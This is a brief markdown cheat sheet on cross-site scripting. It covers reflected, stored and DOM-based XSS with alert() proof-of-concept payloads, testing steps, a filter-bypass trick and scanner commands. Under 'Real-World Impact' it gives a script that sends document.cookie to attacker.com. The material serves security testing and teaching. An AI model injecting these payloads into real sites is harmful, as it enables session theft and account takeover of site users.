# üõ†Ô∏è XSS (Cross-Site Scripting)

## Overview
XSS vulnerabilities allow an attacker to inject and execute malicious JavaScript in a victim's browser.

## Types of XSS
1. **Reflected XSS**:
    - Injected scripts are reflected in the response.
    - Example Payload:
        ```html
        <script>alert('Reflected XSS');</script>
        ```

2. **Stored XSS**:
    - Malicious scripts are permanently stored on the server.
    - Example Scenario:
        - Inject the payload into a comment box or profile field.
        ```html
        <script>alert('Stored XSS');</script>
        ```

3. **DOM-Based XSS**:
    - Scripts are executed directly in the browser via vulnerable JavaScript code.
    - Example Payload:
        ```html
        <img src=x onerror=alert('DOM XSS')>
        ```

## Testing Steps
1. Identify input fields that reflect user data (e.g., search bars, forms).
2. Insert basic payloads like:
    ```html
    <script>alert('XSS');</script>
    ```
3. Gradually test advanced payloads (bypass filters, obfuscation):
    ```html
    <svg onload=alert('XSS')>
    ```

## Tools
- **XSStrike**:
    ```bash
    python3 xsstrike.py -u "https://example.com/page?q=test"
    ```
- **Burp Suite**:
    - Use Intruder to fuzz parameters with payloads.
- **XSS Hunter**:
    - Use to test advanced scenarios and track callbacks.

## Tips
- Test all input fields, including hidden ones.
- Bypass filters using encoding or alternate tags.
    ```html
    <scr<script>ipt>alert('Bypassed')</scr<script>ipt>
    ```

## Real-World Impact
- Steal cookies/session tokens:
    ```html
    <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
    ```
- Deface websites or phishing attacks via stored XSS.
